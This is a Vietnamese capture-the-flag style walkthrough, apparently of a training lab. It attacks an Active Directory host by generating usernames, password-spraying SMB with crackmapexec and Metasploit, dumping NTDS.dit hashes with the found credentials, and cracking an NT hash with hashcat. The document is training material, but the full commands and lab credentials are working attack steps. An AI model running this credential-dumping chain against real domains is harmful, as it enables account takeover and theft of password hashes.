<h1>Attacking Active Directory & NTDS.dit</h1>\

![image](https://github.com/user-attachments/assets/bc6bf75a-a3d9-4c77-b9b9-df6477e162ba)

![image](https://github.com/user-attachments/assets/c7e4a226-47e7-4f4f-b9f7-0da54bd27250)

![image](https://github.com/user-attachments/assets/163f93be-44e4-42cb-a77f-76b110a5d254)

Như mọi mở đầu, chạy `nmap -sV 10.129.202.85` và thấy chưa biết nên khai thác gì:

![image](https://github.com/user-attachments/assets/a97ec0d5-4749-4db4-aff2-6961c6003d06)

Ở câu hỏi có mấy cái tên nên tôi tạo 1 vài usernane với tool [username anarchy](https://github.com/urbanadventurer/username-anarchy):

![image](https://github.com/user-attachments/assets/0ba7da15-81bd-4482-9f15-feac378718b2)

Dùng `crackmapexec smb 10.129.202.85 -u user.txt -p /usr/share/wordlists/fasttrack.txt` để mò username:pass :

![image](https://github.com/user-attachments/assets/1cca2717-f0c8-4aec-8827-cfa8bb2a6a43)

Sau 1 lúc thì có cjohnson:Welcome1212 :

![image](https://github.com/user-attachments/assets/539d30ca-105d-4194-9154-fec1ea88fa65)

Dùng lệnh `crackmapexec smb 10.129.204.43 -u cjohnson -p 'Welcome1212' --ntds` để lấy ntds thôi:

![image](https://github.com/user-attachments/assets/c05c71bc-fe5b-41dd-9f40-f5a794d2e178)

Không hiểu sao, đi tìm trên forum thì thấy bảo dùng metasploit để chạy:

![image](https://github.com/user-attachments/assets/04304609-a2f0-4a99-90c1-a891d374ff6f)

![image](https://github.com/user-attachments/assets/b89c256b-f563-4f13-9f7f-62b88982d55d)

Sau gần tiếng:

![image](https://github.com/user-attachments/assets/4435306c-ce78-4576-a0bc-20a81020a3bb)

jmarston:P@ssword!

Hết thời gian nên đổi ip mới:

![image](https://github.com/user-attachments/assets/470b7b57-bb4f-4572-8f41-5bca37eed829)

Dùng `crackmapexec smb 10.129.204.43 -u jmarston -p P@ssword! --ntds` để lấy ntds:

![image](https://github.com/user-attachments/assets/b24b66ef-2113-412f-ad2f-4085a4791bc0)

![image](https://github.com/user-attachments/assets/debb5b38-8240-4511-abc4-7d2aa73d7d84)

Tôi có được hash của user cần tìm pass, dùng hashcat `sudo hashcat -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt`:

![image](https://github.com/user-attachments/assets/31e50672-928a-4452-b9c0-7624c9512ead)

